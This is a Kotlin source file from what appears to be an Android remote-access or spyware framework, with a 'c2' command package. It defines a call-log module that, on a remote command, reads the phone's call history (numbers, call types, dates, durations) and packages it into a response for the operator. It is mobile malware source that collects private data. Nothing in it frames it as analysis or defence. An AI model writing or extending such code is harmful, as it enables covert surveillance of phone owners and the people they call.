package org.synapse.core.modules

import android.content.Context
import android.provider.CallLog
import org.synapse.core.c2.Command
import org.synapse.core.core.CallEntry
import org.synapse.core.core.SynapseResponse

object CallLogModule {

    suspend fun list(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
        val filter = cmd.params["filter"]  // incoming, outgoing, missed, all

        return try {
            val calls = mutableListOf<CallEntry>()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT $count"
            )

            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    val callType = if (typeIdx >= 0) {
                        when (it.getInt(typeIdx)) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                            CallLog.Calls.REJECTED_TYPE -> "rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "blocked"
                            else -> "unknown"
                        }
                    } else "unknown"

                    // Apply filter if specified
                    if (filter != null && filter != "all" && callType != filter) continue

                    calls.add(CallEntry(
                        number = if (numIdx >= 0) it.getString(numIdx) ?: "" else "",
                        type = callType,
                        date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                        duration = if (durIdx >= 0) it.getLong(durIdx) else 0L
                    ))
                }
            }

            SynapseResponse.CallLogResponse(
                calls = calls,
                count = calls.size
            )
        } catch (e: SecurityException) {
            SynapseResponse.ErrorResponse("calls:permission_denied:${e.message}", "calls")
        } catch (e: Exception) {
            SynapseResponse.ErrorResponse("calls:${e.message}", "calls")
        }
    }
}
